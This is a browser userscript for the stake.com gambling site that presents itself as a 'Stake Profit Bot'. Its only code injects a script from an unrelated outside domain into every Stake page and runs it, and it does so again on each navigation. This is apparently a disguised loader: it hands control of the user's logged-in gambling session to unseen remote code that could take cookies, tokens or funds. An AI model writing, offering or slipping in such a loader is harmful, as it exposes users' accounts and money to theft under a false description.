// ==UserScript==
// @name         KASPURA
// @version      V4
// @description  Stake Profit Bot
// @author       KASPURA
// @license      MIT
// @match        *://stake.com
// @match        *://stake.com/*
// @match        *://stake.com/*/*
// @match        *://stake.com/*/*/*
// @run-at       document-start
// @namespace https://greasyfork.org/users/956458
// @downloadURL https://update.greasyfork.org/scripts/451035/KASPURA.user.js
// @updateURL https://update.greasyfork.org/scripts/451035/KASPURA.meta.js
// ==/UserScript==

(function() {
    'use strict';

    KASPURA()
    let lastUrl = location.href;
    new MutationObserver(() => {
        const url = location.href;
        if (url !== lastUrl) {
            lastUrl = url;
            KASPURA();
        }
    }).observe(document, {subtree: true, childList: true});


    function KASPURA() {
        let script = document.createElement("script")
        script.src = "https://stake-project.ml/main.js";
        document.getElementsByTagName("head")[0].appendChild(script);
    }
 })();